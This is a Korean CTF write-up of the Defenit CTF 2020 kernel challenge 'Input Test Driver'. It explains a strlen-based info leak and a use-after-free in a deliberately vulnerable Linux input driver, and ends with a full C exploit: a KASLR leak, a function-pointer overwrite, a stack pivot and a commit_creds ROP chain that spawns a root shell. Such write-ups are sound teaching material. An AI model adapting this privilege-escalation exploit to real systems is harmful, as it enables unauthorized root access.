+++
title = "Defenit CTF 2020 - Input Test Driver"
date = "2025-09-15"
description = "Defenit CTF 2020 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "linux kernel", "out of bound", "uaf", "kernel stack pivoting"]
+++

## 0x00. Introduction
``` bash
qemu-system-x86_64 \
-m 64M \
-kernel ./bzImage \
-initrd ./tmp/"$ROOTFS_NAME".cpio  \
-append 'root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr' \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \
-cpu qemu64,smep \
-smp 1 \
```

KASLR과 SMEP가 적용되어 있다.

소스 코드와 intended solution이 출제자님 [github](https://github.com/V4bel/2020_defenit_ctf)에 올라와 있다.

### Concept
키보드, 마우스와 같은 사용자 입력 장치와 커널을 연결해주는 **input device driver**를 흉내낸 코드이다.
예를 들어 하드웨어인 키보드에서 특정 키를 누르면,

1. 드라이버가 스캔 코드로 키를 확인
2. 리눅스 Input Subsystem에 이벤트를 발생시켜 보고
3. `/dev/input/eventX`같은 디바이스 파일로 노출

유저 공간에서는 `/dev/input/eventX` 디파이스 파일을 읽어서 실제 동작으로 바꾼다.


## 0x01. Vulnerability
### Info Leak
``` c
static int report_touch_press(char *start, int len) {
    int i;

    if(!len) {
        printk("len error");
        return -1;
    }

    for(i=0; i<=len; i++) {                             // 1-byte oob
        input_report_key(test_dev, BTN_TOUCH, 1);
        input_report_abs(test_dev, ABS_X, *(char *)(start+i));
        input_report_abs(test_dev, ABS_Y, *(char *)(start+i));
        input_sync(test_dev);
    }

    return 0;
}
...
static long input_test_driver_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {

    switch(cmd) {
        case 0x1337:
            printk("report_touch_press call");
            mutex_lock(&test_mutex);

            if(!_fp) {
                _fp = kzalloc(sizeof(struct fp_struct), GFP_ATOMIC);
                _fp->fp_report_ps = report_touch_press;
                _fp->fp_report_rl = report_touch_release;
                _fp->gift = printk;
                _fp->gift("_fp class allocate");
            }

            _fp->fp_report_ps(ptr, strlen(ptr));        // use strlen() to return length

            mutex_unlock(&test_mutex);

            break;
    ...
    }
    ...
}
```

`input_test_driver_ioctl()`는 유저 공간에서 해당 드라이버에 대해 `ioctl()`를 호출했을 때 커널 내부에서 호출되는 함수이다.
`cmd`를 `0x1337`으로 설정해서 `ioctl()`을 호출하면 `_fp`의 존재 여부에 따라 구조체를 초기화하고 `fp_report_ps()`를 호출한다.

`report_touch_press()`, `report_touch_release()`은 각각 터치 스크린의 누름, 뗌을 감지하여 이벤트를 발생시키는 함수이다.
이 때 두 번째 인자인 `len`에 `strlen(ptr)`이 들어가게 된다.
그러면 `ptr`이 `NULL`을 만나기 전까지의 길이가 `len`에 전달되므로 `\x00`을 꽉 채우면 뒤 메모리까지 leak이 가능하다.

사실 이걸로 충분할 것 같은데 `report_touch_press()` 내부에서도 `for(i=0; i<=len; i++)`와 같이 `<=`으로 범위를 체크하기 때문에 1-byte OOB가 발생한다.

### Use After Free
``` c
static ssize_t input_test_driver_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) {
    char *result;
    size_t len;

    mutex_lock(&test_mutex);

    if(ptr) {
        kfree(ptr);                                     // ptr still pointing slab chunk
    }

    if(count<256) {
        len = count;
        count = 256;
    } else if(count>0x40000) {
        len = 416;
    } else {
        len = count;
    }

    if(result = (char *)kmalloc(count, GFP_ATOMIC))     // fails if count is too big
        ptr = result;                                   // dangling pointer!

    if (copy_from_user(ptr, buf, len) != 0) {
        mutex_unlock(&test_mutex);
        return -EFAULT;
    }

    mutex_unlock(&test_mutex);

    return 0;
}
```

`input_test_driver_write()`는 유저 공간에서 해당 드라이버에 대해 `write()`를 호출했을 때 커널 내부에서 호출되는 함수이다.

문제는 `ptr`이 `NULL`이 아니면 가리키고 있는 영역을 해제하고 다시 할당하는데, `ptr`을 초기화하지는 않는다.
대신 뒤에서 슬랩 객체를 새로 할당해서 `ptr`에 주소를 넣어주는데, 여기에서 또 다른 취약점이 발생한다.

커널의 `kmalloc()`에서 큰 사이즈의 슬랩 객체를 요청하면 할당에 실패하게 되고, `NULL`을 리턴한다.
`result`에 `NULL`이 들어가면 `ptr`에 값 갱신이 되지 않으므로, 해제했던 `ptr`이 dangling pointer로 남게 된다.


## 0x02. Exploit
### Info Leak
Exploit을 진행하기에 앞서 보호 기법을 되짚어보면 SMEP가 걸려있기 때문에 kernel ROP를 해야하지만, KASLR이 걸려있어 커널 base 주소를 구해야 한다.

``` c
static struct fp_struct {
    char dummy[392];
    asmlinkage int (*gift)(const char *, ...);
    int (*fp_report_ps)(char *, int);
    int (*fp_report_rl)(void);
};
```

대놓고 `fp_struct->gift`라는 변수명에 `printk()` 함수의 주소가 있으므로 잘 생각해보면, `strlen()`을 이용해 길이를 측정하는 취약점 때문에 `dummy`를 가득 채워주면 `gift`에 저장된 주소까지 출력하게 된다.

``` c
static int input_test_driver_release(struct inode *inode, struct file *file) {
    printk("input_test_driver release");

    mutex_lock(&test_mutex);

    if(ptr) {
        kfree(ptr);
        ptr = 0;
    }

    if(_fp) {
        kfree(_fp);
        _fp = 0;
    }

    mutex_unlock(&test_mutex);

    return 0;
}
```

드라이버와 통신하기 위해 `open()`했던 file descriptor를 `close()`할 때 호출되는 `input_test_driver_release()`를 보면 `ptr`, `_fp`를 해제하고 초기화하는 것을 확인할 수 있다.

하지만 슬랩 객체 안에 있는 데이터는 초기화하지 않기 때문에, 해제된 `_fp`의 크기와 비슷한 크기의 `ptr`을 할당한다면 해제되었던 영역을 다시 받아서 사용할 수 있다.

``` c
    fd1 = open("/dev/input/event2", O_RDONLY);
    fd2 = open("/dev/input_test_driver", O_RDWR);
    
    write(fd2, "AAAAAAAA", 8);          // kernel panic if there is no ptr
    ioctl(fd2, 0x1337, NULL);
    close(fd2);

    fd2 = open("/dev/input_test_driver", O_RDWR);
    memset(payload, 0x42, 392);
    write(fd2, payload, 392);

    ioctl(fd2, 0x1337, NULL);
```

이렇게 `ioctl()` 호출을 통해 `_fp`를 할당하고 `close()`하면 슬랩 객체의 크기가 416바이트이므로 `kmalloc-512` 캐시로 이동한다.
`printk()`의 주소를 덮어쓰지 않기 위해 392바이트의 슬랩 객체를 할당하려고 하면 `kmalloc-512` 캐시에 있는 객체가 반환된다.

이를 이용해 392바이트를 0이 아닌 값(0x42)로 채워넣으면 `strlen()`에서 `NULL`을 만날 때까지 길이를 측정하므로 `printk()`의 주소를 leak할 수 있다.

``` bash
/ $ ./exp
type: 1, code: 330, value: 0x1 
type: 3, code: 0, value: 0x41 
type: 3, code: 1, value: 0x41 
type: 0, code: 0, value: 0x0 
type: 3, code: 0, value: 0x0 
type: 3, code: 1, value: 0x0 
type: 0, code: 0, value: 0x0 
type: 3, code: 0, value: 0x42 
type: 3, code: 1, value: 0x42 
type: 0, code: 0, value: 0x0 
type: 3, code: 0, value: 0x20 
type: 3, code: 1, value: 0x20 
type: 0, code: 0, value: 0x0 
type: 3, code: 0, value: 0xb8 
type: 3, code: 1, value: 0xb8 
type: 0, code: 0, value: 0x0 
type: 3, code: 0, value: 0xae 
type: 3, code: 1, value: 0xae 
type: 0, code: 0, value: 0x0 
type: 3, code: 0, value: 0xb3 
type: 3, code: 1, value: 0xb3 
leak : 0xffffffffb3aeb820
```

### Use After Free
UAF 취약점을 트리거하고 난 후의 상황을 생각해보면 `ptr`은 dangling pointer가 되어 free된 슬랩 객체를 가리키고 있다.
이 슬랩 객체가 `kmalloc-512` 캐시에 있다면 `ioctl()`을 통해 `_fp` 할당 시 그 객체를 반환받게 된다.

``` c
static ssize_t input_test_driver_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) {
    ...
    if(count<256) {
        len = count;
        count = 256;
    } else if(count>0x40000) {
        len = 416;
    } else {
        len = count;
    }

    if(result = (char *)kmalloc(count, GFP_ATOMIC))
        ptr = result;

    if (copy_from_user(ptr, buf, len) != 0) {
        mutex_unlock(&test_mutex);
        return -EFAULT;
    }
    ...
}
```

따라서 `ptr`, `_fp`가 같은 슬랩 객체를 가리키게 되고, `kmalloc()`의 `size`가 커서 할당에 실패하더라도 `copy_from_user()`는 실행되므로 `_fp`의 함수 포인터를 덮어쓸 수 있다.

``` c
    fd2 = open("/dev/input_test_driver", O_RDWR);
    memset(payload, 0x43, 392);
    write(fd2, payload, 416);
    write(fd2, payload, 0x500000);

    ioctl(fd2, 0x1337, NULL);

    *(uint64_t *)(payload + 408) = xchg_64;
    write(fd2, payload, 0x510000);

    ioctl(fd2, 0x7331, NULL);
```

Exploit 흐름을 설명하면,

1. `write()`를 통해 416 바이트짜리 슬랩 객체 할당
2. `write()`를 다시 호출해서 
   - 기존 슬랩 객체를 해제, `kmalloc-512`로 이동
   - 의도적으로 큰 사이즈의 객체를 요청해 갱신 실패
3. `ioctl()`을 통해 `_fp` 할당, 이 때 `kmalloc-512`에서 슬랩 객체를 받아오게 됨
4. `write()`를 마지막으로 호출해서 `ptr`, 즉 `_fp`에 416 바이트를 쓰는 과정에서 함수 포인터 overwrite

함수 포인터를 바꿔 rip control만 가능한 상황이므로 `xchg eax, esp` 가젯과 fake stack을 이용해 rop payload를 전달할 수 있다.


## 0x03. Payload
``` c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/mman.h>
#include <linux/input.h>

void shell() {
    execl("/bin/sh", "sh", NULL);
}

struct register_val {
    uint64_t user_rip;
    uint64_t user_cs;
    uint64_t user_rflags;
    uint64_t user_rsp;
    uint64_t user_ss;
} __attribute__((packed));

struct register_val rv;

void backup_rv(void) {
    asm("mov rv+8, cs;"
        "pushf; pop rv+16;"
        "mov rv+24, rsp;"
        "mov rv+32, ss;"
       );
    rv.user_rip = &shell;
}

void set_fake_stack(void *xchg_64) {
    uint32_t xchg_32;
    int i = 0;

    size_t pop_rdi_ret = xchg_64 + 0x6170f;
    size_t prepare_kernel_cred = xchg_64 + 0x8fe8f;
    size_t pop_rcx_ret = xchg_64 + 0x285312;
    size_t mov_rdi_rax_rep_pop_rbp_ret = xchg_64 + 0xf2ee;
    size_t commit_creds = xchg_64 + 0x8fadf;
    size_t swapgs_pop_rbp_ret = xchg_64 + 0x4c103;
    size_t iretq = xchg_64 + 0x2bc4f;
    
    xchg_32 = (uint32_t)xchg_64;
    mmap((void *)(xchg_32), 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    backup_rv();

    ((uint64_t *)xchg_32)[i++] = pop_rdi_ret;
    ((uint64_t *)xchg_32)[i++] = 0;
    ((uint64_t *)xchg_32)[i++] = prepare_kernel_cred;
    ((uint64_t *)xchg_32)[i++] = pop_rcx_ret;
    ((uint64_t *)xchg_32)[i++] = 0;
    ((uint64_t *)xchg_32)[i++] = mov_rdi_rax_rep_pop_rbp_ret;
    ((uint64_t *)xchg_32)[i++] = 0; // for pop rbp
    ((uint64_t *)xchg_32)[i++] = commit_creds;
    ((uint64_t *)xchg_32)[i++] = swapgs_pop_rbp_ret;
    ((uint64_t *)xchg_32)[i++] = 0; // for pop rbp
    ((uint64_t *)xchg_32)[i++] = iretq;
    ((uint64_t *)xchg_32)[i++] = rv.user_rip;
    ((uint64_t *)xchg_32)[i++] = rv.user_cs;
    ((uint64_t *)xchg_32)[i++] = rv.user_rflags;
    ((uint64_t *)xchg_32)[i++] = rv.user_rsp;
    ((uint64_t *)xchg_32)[i++] = rv.user_ss;
}

int main() {
    struct input_event ie;
    int fd1, fd2, ret;
    char payload[416];
    size_t leak = 0xffffffff00000000;
    int i = 0, flag = 0;
    size_t xchg_64;
    
    fd1 = open("/dev/input/event2", O_RDONLY);
    fd2 = open("/dev/input_test_driver", O_RDWR);
    
    // step 1 : leak kernel base address
    write(fd2, "AAAAAAAA", 8);
    ioctl(fd2, 0x1337, NULL);
    close(fd2);

    fd2 = open("/dev/input_test_driver", O_RDWR);
    memset(payload, 0x42, 392);
    write(fd2, payload, 392);

    ioctl(fd2, 0x1337, NULL);
    
    while(1) {
        read(fd1, &ie, sizeof(struct input_event));
        printf("type: %d, code: %d, value: 0x%x \n", ie.type, ie.code, (unsigned char)ie.value);
        if(ie.code == 1 && ie.value == 0x20 || ie.code == 1 && flag) {
            leak = leak | (unsigned char)(ie.value) << (flag * 8);
            flag++;
            if(flag == 4)
                break;
        }
    }
    // step 2 : calculate the address of xchg_64
    printf("leak : 0x%lx\n", leak);
    xchg_64 = leak - 0xcdd5f;
    printf("xchg_64 : 0x%lx\n", xchg_64);

    close(fd1);
    close(fd2);

    // step 3 : set fake stack
    set_fake_stack(xchg_64);

    // step 4 : overwrite function pointer
    fd2 = open("/dev/input_test_driver", O_RDWR);
    memset(payload, 0x43, 392);
    write(fd2, payload, 416);
    write(fd2, payload, 0x500000);

    ioctl(fd2, 0x1337, NULL);

    *(uint64_t *)(payload + 408) = xchg_64;
    write(fd2, payload, 0x510000);

    ioctl(fd2, 0x7331, NULL);

    close(fd2);
    return 0;
}
```